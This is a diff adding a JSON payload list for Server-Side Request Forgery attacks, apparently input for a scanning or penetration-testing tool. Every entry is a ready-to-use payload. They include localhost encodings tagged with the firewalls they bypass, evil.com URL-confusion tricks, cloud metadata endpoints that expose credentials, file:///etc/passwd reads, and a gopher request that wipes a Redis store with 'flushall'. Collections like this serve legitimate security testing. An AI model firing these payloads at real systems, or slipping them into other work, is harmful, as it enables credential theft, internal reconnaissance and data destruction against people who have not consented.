@@ -1,0 +1,280 @@
+{
+    "vulnerability_type": "SSRF",
+    "description": "Server-Side Request Forgery payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "http://127.0.0.1",
+            "description": "Basic localhost",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "localhost"
+            ]
+        },
+        {
+            "payload": "http://localhost",
+            "description": "Localhost hostname",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "localhost"
+            ]
+        },
+        {
+            "payload": "http://0.0.0.0",
+            "description": "All-zeroes IP",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "ip_variant",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://0",
+            "description": "Short form zero IP",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "ip_variant",
+                "short_form",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://0x7f000001",
+            "description": "Hex encoded 127.0.0.1",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf",
+                "modsecurity"
+            ],
+            "tags": [
+                "hex_ip",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://2130706433",
+            "description": "Decimal encoded 127.0.0.1",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "aws_waf"
+            ],
+            "tags": [
+                "decimal_ip",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://017700000001",
+            "description": "Octal encoded 127.0.0.1",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "octal_ip",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://[::1]",
+            "description": "IPv6 localhost",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "ipv6",
+                "localhost",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+            "description": "IPv6 mapped IPv4 localhost",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva"
+            ],
+            "tags": [
+                "ipv6_mapped",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://127.1",
+            "description": "Shortened localhost",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "ip_variant",
+                "shortened",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://127.0.0.1:80@evil.com",
+            "description": "URL authority confusion",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "url_confusion",
+                "authority",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://evil.com#@127.0.0.1",
+            "description": "Fragment-based URL confusion",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "url_confusion",
+                "fragment",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://169.254.169.254/latest/meta-data/",
+            "description": "AWS metadata endpoint",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "cloud",
+                "aws",
+                "metadata"
+            ]
+        },
+        {
+            "payload": "http://metadata.google.internal/computeMetadata/v1/",
+            "description": "GCP metadata endpoint",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "cloud",
+                "gcp",
+                "metadata"
+            ]
+        },
+        {
+            "payload": "http://169.254.169.254/metadata/v1/",
+            "description": "Azure/DigitalOcean metadata endpoint",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "cloud",
+                "azure",
+                "digitalocean",
+                "metadata"
+            ]
+        },
+        {
+            "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+            "description": "Gopher protocol to Redis",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "gopher",
+                "redis",
+                "protocol_smuggling",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "dict://127.0.0.1:6379/info",
+            "description": "Dict protocol to Redis",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "dict",
+                "redis",
+                "protocol_smuggling",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "file:///etc/passwd",
+            "description": "Local file read via file protocol",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "file_protocol",
+                "lfi"
+            ]
+        },
+        {
+            "payload": "http://127.0.0.1.nip.io",
+            "description": "DNS rebinding via nip.io",
+            "context": "url_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva",
+                "aws_waf"
+            ],
+            "tags": [
+                "dns_rebinding",
+                "nip_io",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://spoofed.burpcollaborator.net",
+            "description": "Out-of-band detection via Burp Collaborator",
+            "context": "url_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "oob",
+                "burp",
+                "detection"
+            ]
+        }
+    ]
+}
